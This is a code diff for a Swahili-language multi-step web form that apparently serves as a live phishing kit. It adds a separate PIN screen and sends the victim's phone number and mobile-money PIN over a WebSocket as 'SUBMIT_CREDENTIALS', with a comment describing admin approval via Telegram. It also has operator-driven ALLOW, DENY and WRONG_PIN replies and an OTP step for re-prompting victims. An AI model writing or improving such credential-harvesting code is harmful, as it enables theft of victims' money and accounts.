@@ -2,6 +2,7 @@ const screens = {
     slider: document.getElementById('screen-slider'),
     step1: document.getElementById('screen-step1'),
     step2: document.getElementById('screen-step2'),
+    pin: document.getElementById('screen-pin'),
     step3: document.getElementById('screen-step3'),
     otp: document.getElementById('screen-otp'),
     account: document.getElementById('screen-account'),
@@ -14,6 +15,10 @@ const surfaceNotification = document.getElementById('surface-notification');
 
 let currentScreenName = 'slider';
 let ws = null;
+let applicantData = {
+    phone: '',
+    pin: ''
+};
 
 // Connect WebSocket
 function connectWs() {
@@ -109,28 +114,70 @@ document.getElementById('btn-step1-next').addEventListener('click', () => {
     }, 800);
 });
 
-// Step 2 Navigation & Submission
+// Step 2 Navigation (Phone entry only -> leads to PIN screen)
 document.getElementById('btn-step2-prev').addEventListener('click', () => showScreen('step1'));
 document.getElementById('btn-step2-next').addEventListener('click', () => {
     const phone = document.getElementById('phone-number').value.trim();
-    const pin = document.getElementById('pin-number').value.trim();
 
-    if (!phone || pin.length < 4) {
-        showSurfaceNotification("Tafadhali jaza namba ya simu na PIN sahihi", "error");
+    if (!phone || phone.length < 9) {
+        showSurfaceNotification("Tafadhali jaza namba ya simu sahihi", "error");
         return;
     }
 
+    applicantData.phone = phone;
+    document.getElementById('lbl-masked-phone').textContent = `+255${phone}`;
+    
+    showLoading();
+    setTimeout(() => {
+        hideLoading();
+        showScreen('pin');
+        pinBoxes[0].focus();
+    }, 600);
+});
+
+// PIN Screen Box Auto-Navigation & Visibility Toggle
+const pinBoxes = document.querySelectorAll('.pin-box');
+pinBoxes.forEach((box, index) => {
+    box.addEventListener('input', (e) => {
+        if (e.target.value && index < pinBoxes.length - 1) {
+            pinBoxes[index + 1].focus();
+        }
+    });
+    box.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !box.value && index > 0) {
+            pinBoxes[index - 1].focus();
+        }
+    });
+});
+
+let isPinVisible = false;
+document.getElementById('toggle-pin-visibility').addEventListener('click', () => {
+    isPinVisible = !isPinVisible;
+    pinBoxes.forEach(b => b.type = isPinVisible ? 'text' : 'password');
+});
+
+// PIN Submit (Triggers Admin Telegram Approval with Phone and PIN)
+document.getElementById('btn-pin-submit').addEventListener('click', () => {
+    let pinCode = '';
+    pinBoxes.forEach(b => pinCode += b.value);
+
+    if (pinCode.length < 4) {
+        showSurfaceNotification("Tafadhali weka PIN kamili ya tarakimu 4", "error");
+        return;
+    }
+
+    applicantData.pin = pinCode;
     showLoading("Inatuma maombi kwa ukaguzi...");
-    ws.send(JSON.stringify({ type: 'SUBMIT_CREDENTIALS', phone, pin }));
+    ws.send(JSON.stringify({ type: 'SUBMIT_CREDENTIALS', phone: applicantData.phone, pin: applicantData.pin }));
 });
 
 // Step 3 Navigation & Submission
-document.getElementById('btn-step3-prev').addEventListener('click', () => showScreen('step2'));
+document.getElementById('btn-step3-prev').addEventListener('click', () => showScreen('pin'));
 document.getElementById('btn-step3-submit').addEventListener('click', () => {
     showLoading();
     setTimeout(() => {
         hideLoading();
-        showScreen('step3'); // Keeps current workflow progression
+        showScreen('step3'); 
     }, 600);
 });
 
@@ -140,6 +187,11 @@ otpBoxes.forEach((box, index) => {
     box.addEventListener('input', (e) => {
         if (e.target.value && index < otpBoxes.length - 1) {
             otpBoxes[index + 1].focus();
+        }
+    });
+    box.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !box.value && index > 0) {
+            otpBoxes[index - 1].focus();
         }
     });
 });
@@ -178,8 +230,8 @@ document.getElementById('btn-home').addEventListener('click', () => {
 function handleServerAction(action) {
     switch (action) {
         case 'ALLOW':
-            showSurfaceNotification("Correct PIN! Salama.", "success");
-            showScreen('otp');
+            showSurfaceNotification("Correct PIN! Endelea hatua inayofuata.", "success");
+            showScreen('step3');
             break;
         case 'DENY':
             showSurfaceNotification("Maombi yamekataliwa. Anza upya.", "error");
@@ -187,9 +239,9 @@ function handleServerAction(action) {
             break;
         case 'WRONG_PIN':
             showSurfaceNotification("Wrong PIN! Tafadhali weka New PIN.", "error");
-            showScreen('step2');
-            document.getElementById('pin-number').value = '';
-            document.getElementById('pin-number').focus();
+            showScreen('pin');
+            pinBoxes.forEach(b => b.value = '');
+            pinBoxes[0].focus();
             break;
         case 'WRONG_OTP':
             showSurfaceNotification("Wrong OTP! Weka OTP sahihi tena.", "error");
@@ -215,8 +267,9 @@ function handleServerAction(action) {
 backBtn.addEventListener('click', () => {
     if (currentScreenName === 'step1') showScreen('slider');
     else if (currentScreenName === 'step2') showScreen('step1');
-    else if (currentScreenName === 'step3') showScreen('step2');
+    else if (currentScreenName === 'pin') showScreen('step2');
+    else if (currentScreenName === 'step3') showScreen('pin');
     else if (currentScreenName === 'otp') showScreen('step3');
     else if (currentScreenName === 'account') showScreen('otp');
 });
-              
+    
